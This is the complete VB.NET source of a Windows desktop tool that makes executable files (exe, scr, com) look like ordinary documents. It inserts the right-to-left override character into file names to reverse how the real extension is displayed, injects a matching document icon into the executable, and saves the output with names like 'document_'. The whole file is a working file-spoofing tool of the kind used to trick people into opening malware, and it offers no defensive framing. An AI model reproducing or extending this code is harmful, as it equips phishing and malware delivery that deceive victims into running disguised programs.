Imports System.IO
Imports System.Linq
Imports Microsoft.Win32
Imports Forms = System.Windows.Forms

Class MainWindow

    Private ReadOnly ReverseCharacter As String = ChrW(&H202E)
    Private ReadOnly ExecutableExtensions As String() = {"exe", "scr", "com"}

    Private IconFolderName As String = Path.Combine(My.Application.Info.DirectoryPath, "Win10Icons")
    Private SelectedFilePath As String = String.Empty
    Private IconMap As New Dictionary(Of String, String)(StringComparer.OrdinalIgnoreCase)

    Public Sub Main()
        EnsureIconFolderLoaded()
        LoadSourceExtensions()
        InitializeDefaults()
        UpdateName()
    End Sub

    Private Sub InitializeDefaults()
        If SourceExtension.Items.Count > 0 Then
            SourceExtension.SelectedIndex = 0
        End If

        If SpoofExtension.Items.Count > 0 Then
            SpoofExtension.SelectedIndex = 0
        End If

        OutputFolder.Text = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
        NameInput.Text = "document_"
        SetStatus("Ready", Brushes.LightGreen)
    End Sub

    Private Sub EnsureIconFolderLoaded()
        If Directory.Exists(IconFolderName) Then
            AddSpoofExtensions(IconFolderName)
            Return
        End If

        MessageBox.Show("Win10Icons folder not found. Select an icon folder with .ico files.", "Icon folder not found", MessageBoxButton.OK, MessageBoxImage.Warning)

        Using iconFolder As New Forms.FolderBrowserDialog()
            iconFolder.Description = "Select icon folder"
            iconFolder.ShowNewFolderButton = False

            If iconFolder.ShowDialog() = Forms.DialogResult.OK AndAlso Not String.IsNullOrWhiteSpace(iconFolder.SelectedPath) Then
                IconFolderName = iconFolder.SelectedPath
                AddSpoofExtensions(IconFolderName)
                Return
            End If
        End Using

        MessageBox.Show("An icon folder is required to continue.", "Setup incomplete", MessageBoxButton.OK, MessageBoxImage.Error)
        Environment.Exit(0)
    End Sub

    Private Sub AddSpoofExtensions(iconDirectory As String)
        IconMap.Clear()
        SpoofExtension.Items.Clear()

        Dim icons = Directory.GetFiles(iconDirectory, "*.ico", SearchOption.TopDirectoryOnly).
            Select(Function(filePath) Path.GetFileNameWithoutExtension(filePath)).
            Where(Function(fileName) Not String.IsNullOrWhiteSpace(fileName)).
            Distinct(StringComparer.OrdinalIgnoreCase).
            OrderBy(Function(fileName) fileName).
            ToList()

        For Each iconName In icons
            Dim fullPath = Path.Combine(iconDirectory, iconName + ".ico")
            IconMap(iconName) = fullPath
            SpoofExtension.Items.Add(iconName)
        Next

        If icons.Count = 0 Then
            MessageBox.Show("No .ico files were found in the selected folder.", "No icons found", MessageBoxButton.OK, MessageBoxImage.Warning)
        End If
    End Sub

    Private Sub LoadSourceExtensions()
        SourceExtension.Items.Clear()

        For Each extensionName In ExecutableExtensions
            SourceExtension.Items.Add(extensionName)
        Next
    End Sub

    Private Sub OpenFile_Click(sender As Object, e As RoutedEventArgs) Handles OpenFile.Click
        Dim fileDialog As New OpenFileDialog() With {
            .Title = "Select executable file",
            .Filter = "Executable files (*.exe;*.scr;*.com)|*.exe;*.scr;*.com|All files (*.*)|*.*",
            .FilterIndex = 1,
            .RestoreDirectory = True,
            .CheckFileExists = True
        }

        If fileDialog.ShowDialog() <> True Then
            Return
        End If

        SetSelectedFile(fileDialog.FileName)
    End Sub

    Private Sub BrowseOutputFolder_Click(sender As Object, e As RoutedEventArgs) Handles BrowseOutputFolder.Click
        Using folderDialog As New Forms.FolderBrowserDialog()
            folderDialog.Description = "Select output folder"
            folderDialog.ShowNewFolderButton = True

            If folderDialog.ShowDialog() = Forms.DialogResult.OK AndAlso Not String.IsNullOrWhiteSpace(folderDialog.SelectedPath) Then
                OutputFolder.Text = folderDialog.SelectedPath
                SetStatus("Output folder updated", Brushes.LightGreen)
            End If
        End Using
    End Sub

    Private Sub OpenOutputFolder_Click(sender As Object, e As RoutedEventArgs) Handles OpenOutputFolder.Click
        If Directory.Exists(OutputFolder.Text) Then
            Process.Start("explorer.exe", OutputFolder.Text)
            Return
        End If

        SetStatus("Output folder does not exist", Brushes.Orange)
    End Sub

    Private Sub SetSelectedFile(filePath As String)
        SelectedFilePath = filePath
        CurrentFile.Text = filePath

        Dim extension = Path.GetExtension(filePath).TrimStart("."c)
        Dim sourceIndex = SourceExtension.Items.IndexOf(extension)

        If sourceIndex >= 0 Then
            SourceExtension.SelectedIndex = sourceIndex
        End If

        If String.IsNullOrWhiteSpace(NameInput.Text) Then
            NameInput.Text = Path.GetFileNameWithoutExtension(filePath) + "_"
        End If

        SetStatus("Source file selected", Brushes.LightGreen)
        UpdateName()
    End Sub

    Private Sub SpoofExtension_SelectionChanged(sender As Object, e As SelectionChangedEventArgs) Handles SpoofExtension.SelectionChanged
        UpdateName()
    End Sub

    Private Sub SourceExtension_SelectionChanged(sender As Object, e As SelectionChangedEventArgs) Handles SourceExtension.SelectionChanged
        UpdateName()
    End Sub

    Private Sub NameInput_TextChanged(sender As Object, e As TextChangedEventArgs) Handles NameInput.TextChanged
        UpdateName()
    End Sub

    Private Sub MainWindow_DragOver(sender As Object, e As DragEventArgs) Handles Me.DragOver
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effects = DragDropEffects.Copy
        Else
            e.Effects = DragDropEffects.None
        End If

        e.Handled = True
    End Sub

    Private Sub MainWindow_Drop(sender As Object, e As DragEventArgs) Handles Me.Drop
        If Not e.Data.GetDataPresent(DataFormats.FileDrop) Then
            Return
        End If

        Dim files = CType(e.Data.GetData(DataFormats.FileDrop), String())
        If files Is Nothing OrElse files.Length = 0 Then
            Return
        End If

        SetSelectedFile(files(0))
    End Sub

    Private Sub UpdateName()
        Dim displayExtension = SpoofExtension.Text
        Dim sourceExtension = SourceExtension.Text

        If String.IsNullOrWhiteSpace(displayExtension) OrElse String.IsNullOrWhiteSpace(sourceExtension) Then
            OutputName.Text = "Select a visible and real extension"
            IconImage.Source = New BitmapImage(New Uri("img/blankfile.ico", UriKind.Relative))
            Return
        End If

        OutputName.Text = NameInput.Text + StrReverse(sourceExtension) + "." + displayExtension

        Dim iconPath As String = Nothing
        If IconMap.TryGetValue(displayExtension, iconPath) AndAlso File.Exists(iconPath) Then
            IconImage.Source = New BitmapImage(New Uri(iconPath, UriKind.Absolute))
        Else
            IconImage.Source = New BitmapImage(New Uri("img/blankfile.ico", UriKind.Relative))
        End If
    End Sub

    Private Function ValidateInputs() As Boolean
        If String.IsNullOrWhiteSpace(SelectedFilePath) OrElse Not File.Exists(SelectedFilePath) Then
            SetStatus("Please select an existing file", Brushes.Orange)
            Return False
        End If

        If String.IsNullOrWhiteSpace(NameInput.Text) Then
            SetStatus("Name cannot be empty", Brushes.Orange)
            Return False
        End If

        If NameInput.Text.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0 Then
            SetStatus("Name contains invalid characters", Brushes.Orange)
            Return False
        End If

        If String.IsNullOrWhiteSpace(SpoofExtension.Text) OrElse String.IsNullOrWhiteSpace(SourceExtension.Text) Then
            SetStatus("Please select both extensions", Brushes.Orange)
            Return False
        End If

        If Not Directory.Exists(OutputFolder.Text) Then
            SetStatus("Output folder does not exist", Brushes.Orange)
            Return False
        End If

        Return True
    End Function

    Private Sub GenerateButton_Click(sender As Object, e As RoutedEventArgs) Handles GenerateButton.Click
        If Not ValidateInputs() Then
            Return
        End If

        Dim spoofName = NameInput.Text + ReverseCharacter + StrReverse(SpoofExtension.Text) + "." + SourceExtension.Text
        Dim destinationPath = Path.Combine(OutputFolder.Text, spoofName)

        If File.Exists(destinationPath) Then
            SetStatus("A file with this name already exists", Brushes.Orange)
            Return
        End If

        Dim workingFile = SelectedFilePath

        Try
            If CopyMode.IsChecked.GetValueOrDefault(True) Then
                File.Copy(SelectedFilePath, destinationPath)
                workingFile = destinationPath
            Else
                File.Move(SelectedFilePath, destinationPath)
                workingFile = destinationPath
                SelectedFilePath = destinationPath
                CurrentFile.Text = destinationPath
            End If
        Catch ex As Exception
            SetStatus("Failed to prepare output file: " + ex.Message, Brushes.OrangeRed)
            Return
        End Try

        Try
            Dim iconPath As String = Nothing
            If IconMap.TryGetValue(SpoofExtension.Text, iconPath) Then
                Iconchanger.InjectIcon(workingFile, iconPath)
            End If
        Catch
            SetStatus("File generated, but icon update failed", Brushes.Orange)
            MessageBox.Show("The file was generated, but icon injection failed for this format.", "Partial success", MessageBoxButton.OK, MessageBoxImage.Warning)
            Return
        End Try

        SetStatus("Successfully generated spoofed file", Brushes.LightGreen)
        MessageBox.Show("Successfully generated spoofed file in:" + Environment.NewLine + OutputFolder.Text, "Success", MessageBoxButton.OK, MessageBoxImage.Information)
    End Sub

    Private Sub SetStatus(message As String, brush As Brush)
        StatusText.Text = message
        StatusText.Foreground = brush
    End Sub

End Class
